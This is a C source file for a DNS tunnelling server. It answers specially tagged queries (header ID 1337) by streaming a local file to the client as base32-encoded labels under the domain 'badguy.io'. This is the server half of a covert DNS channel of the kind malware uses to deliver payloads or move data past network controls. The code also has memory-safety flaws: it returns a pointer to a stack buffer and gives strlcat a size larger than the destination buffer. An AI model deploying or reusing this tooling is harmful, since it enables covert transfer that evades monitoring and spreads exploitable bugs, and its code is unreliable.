#include <arpa/inet.h>
#include <bsd/string.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "base32.h"
#include "debug.h"
#include "dns.h"
#include "payload.h"

#define TTL 300

void save_data(struct dns_query *dns_query);
struct dns_payload * get_payload(struct dns_query *);
void send_file_to_client(struct dns_query *,uuid_t ,int, struct sockaddr_in);
void send_response(struct dns_query *, unsigned char *, size_t, int, struct sockaddr_in);
void send_done_response(unsigned char *, size_t, int, struct sockaddr_in);

int main(int argc, char **argv) {
    printf("dns-server 0.0.1 😉\n");
    
    int sockfd;
    unsigned char buffer[MAX_BUFFER_SIZE];
    struct sockaddr_in servaddr, cliaddr;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }
    
    memset(&servaddr, 0, sizeof(servaddr));
    memset(&cliaddr, 0, sizeof(cliaddr));
    
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;
    servaddr.sin_port = htons(DNS_PORT);

    if (bind(sockfd, (const struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    socklen_t len = sizeof(cliaddr);
    for(;;) {
        memset(buffer, 0, sizeof(buffer));
        int num_received = recvfrom(sockfd, (char *)buffer, MAX_BUFFER_SIZE,
                                    MSG_WAITALL, (struct sockaddr *)&cliaddr, &len);
        char client_addr_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(cliaddr.sin_addr), client_addr_str, INET_ADDRSTRLEN);
        printf("---------------------------\nReceived %d bytes from %s\n",
            num_received, client_addr_str);
        print_buffer(buffer, num_received);

        struct dns_header *header = (struct dns_header *)buffer;
        struct dns_query name_query;
        extract_dns_query(buffer,&name_query);

        if(ntohs(header->id) == 1337) {
            struct dns_payload *req_payload = get_payload(&name_query);
            char uuid[256];
            if(req_payload->action==2)
            {
                uuid_t session_id;
                uuid_unparse(req_payload->uuid, uuid);
                uuid_parse(uuid,session_id);
                char uuid2[256];
                uuid_unparse(session_id,uuid2);
                printf("uuid: %s | uuid2: %s\n",uuid,uuid2);
                send_file_to_client(&name_query,session_id,sockfd,cliaddr);
            }
        }
    }
}

void send_file_to_client(struct dns_query * name_query, uuid_t uuid, int sockfd, struct sockaddr_in cliaddr)
{
    FILE *fin = fopen("test.txt","rb");
    if (!fin) {
        fprintf(stderr, "Unable to open file %s for reading.\n", "test.txt");
        exit(EXIT_FAILURE);
    }
    
    struct dns_payload payload;
    uuid_copy(payload.uuid,uuid);
    char uuid_c[256];
    uuid_unparse(payload.uuid,uuid_c);
    printf("uuid %s\n", uuid_c);
    unsigned char base32_data_buf[256];
    unsigned char request[1024];
    int num_received;
    payload.action = 3;
    payload.sequence = 0;
    while(!feof(fin)) {
        payload.length = (uint8_t)fread(payload.data,1, BLOCKSIZE, fin);
        printf("payload length:%d\n", payload.length);
        if (payload.length != BLOCKSIZE && ferror(fin)) {
            fprintf(stderr, "Unable to read file\n");
            exit(-1);
        }
        printf("Payload:\n");
        print_buffer((unsigned char *)&payload, sizeof(struct dns_payload) - BLOCKSIZE + payload.length);
        size_t num_written =
        base32_encode((uint8_t *)&payload,
                      sizeof(struct dns_payload) - BLOCKSIZE + payload.length,
                      (uint8_t *)base32_data_buf, 256);
        base32_data_buf[num_written] = '\0';
        send_response(name_query,base32_data_buf, num_written, sockfd, cliaddr);
        socklen_t socklen = sizeof(struct sockaddr_in);
        memset(request,0,sizeof(request));
        if ((num_received = recvfrom(sockfd, request, sizeof(request), MSG_WAITALL,
                                    (struct sockaddr *)&cliaddr, &socklen)) == -1) {
            perror("receive failed");
            exit(EXIT_FAILURE);
        }
        printf("Received:\n");
        print_buffer(request, num_received);
        ++payload.sequence;
    }
    struct dns_payload done_payload;
    uuid_copy(done_payload.uuid,uuid);
    done_payload.action = 0;
    done_payload.length = 0;
    done_payload.sequence = 0;
    unsigned char done_base32_data_buf[256];
    size_t num_w = base32_encode(
        (uint8_t *)&done_payload,
        sizeof(struct dns_payload) - BLOCKSIZE,
        (uint8_t *)done_base32_data_buf,256
    );
    done_base32_data_buf[num_w] = '\0';
    send_response(name_query,done_base32_data_buf, num_w, sockfd, cliaddr);
    fclose(fin);
}


void send_response(struct dns_query *name_query,unsigned char *name_prefix_buf,
                    size_t name_prefix_size, int sockfd, struct sockaddr_in cliaddr)
{
    unsigned char dns_buf[1024];
    memset(dns_buf, 0, 1024);
    struct dns_header *header = (struct dns_header *)dns_buf;
    header->id = htons(1337);
    header->rd = 1;
    header->qr = 1;
    header->aa = 0;
    header->ra = 0;
    header->qdcount = htons(1);
    switch (name_query->type) {
        case QTYPE_A:
            header->rcode = RESPONSE_SUCCESS;
            header->ancount = htons(1);
            break;
        case QTYPE_AAAA:
            header->rcode = RESPONSE_SUCCESS;
            header->ancount = 0;
            break;
        default:
            header->rcode = RESPONSE_REFUSED;
            header->ancount = 0;
            break;
    }
    header->nscount = 0;
    header->arcount = 0;
    unsigned char *dns_buf_ptr = dns_buf + sizeof(struct dns_header);
    int num_labels = name_prefix_size / 60 + (name_prefix_size % 60 ? 1 : 0);
    for (int i = 0; i < num_labels; ++i) {
        int start = i * 60;
        size_t count =
            (start + 60 <= name_prefix_size) ? 60 : name_prefix_size - start;
        *dns_buf_ptr = (unsigned char)count;
        memcpy(dns_buf_ptr + 1, name_prefix_buf + start, count);
        dns_buf_ptr += count + 1;
    }
    *dns_buf_ptr = (unsigned char)6;
    memcpy(dns_buf_ptr + 1, "badguy", 6);
    *(dns_buf_ptr + 7) = (unsigned char)2;
    memcpy(dns_buf_ptr + 8, "io", 2);
    *(dns_buf_ptr + 10) = (unsigned char)0;
    *((uint16_t *)(dns_buf_ptr + 11)) = htons(1);
    *((uint16_t *)(dns_buf_ptr + 13)) = htons(1);
    if( name_query->type == 1) 
    {
        struct dns_response_trailer *trailer =
        (struct dns_response_trailer *)(dns_buf_ptr + 15);
        trailer->ans_type = 0xc0; // pointer
        trailer->name_offset = 0x0c;
        trailer->type = htons(QTYPE_A);
        trailer->qclass = htons(QCLASS_INET);
        trailer->ttl = htonl(300);
        trailer->rdlength = htons(4);
        inet_pton(AF_INET, "123.123.123.001", &trailer->rdata);
    }
    size_t buf_size = dns_buf_ptr + 15 - dns_buf + 18;
    if (sendto(sockfd, dns_buf, buf_size, 0,
             (struct sockaddr *)&cliaddr, sizeof(struct sockaddr_in)) == -1) {
        perror("sendto failed");
        exit(EXIT_FAILURE);
    }
}

struct dns_payload * get_payload(struct dns_query *dns_query)
{
    uint8_t base32_buf[300] = {0};
    for (int i = 0; i < dns_query->num_segments - 2; ++i) {
        strlcat((char *)base32_buf, dns_query->segment[i], 1024);
    }
    uint8_t payload_buf[300];
    base32_decode(base32_buf, payload_buf, 300);
    struct dns_payload *payload = (struct dns_payload *)payload_buf;
    printf("Payload\n");
    print_buffer(payload_buf, sizeof(struct dns_payload) - BLOCKSIZE);
    char uuid[256];
    uuid_unparse(payload->uuid, uuid);
    printf("uuid %s, action %d, sequence %d, length %d\n", uuid, payload->action, payload->sequence,
            payload->length);
    return payload;
}